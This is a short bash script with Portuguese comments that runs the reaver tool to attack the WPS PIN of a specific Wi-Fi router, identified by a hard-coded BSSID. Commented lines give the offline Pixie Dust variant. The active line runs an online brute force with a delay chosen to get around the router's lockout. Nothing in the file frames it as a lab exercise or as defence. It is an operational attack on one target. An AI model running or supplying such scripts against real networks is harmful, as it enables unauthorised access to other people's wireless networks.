#!/bin/bash

#modo offline (pixie attack)
#reaver -i wlan1mon -b 54:B8:0A:68:25:2B -K 1 -vv;
#offline 2
#reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -K 1 -P -vv;
#modo online | trava, recomenado -d > 300
reaver -i wlan1mon -b 54:B8:0A:68:25:2B -d 302 -vv;
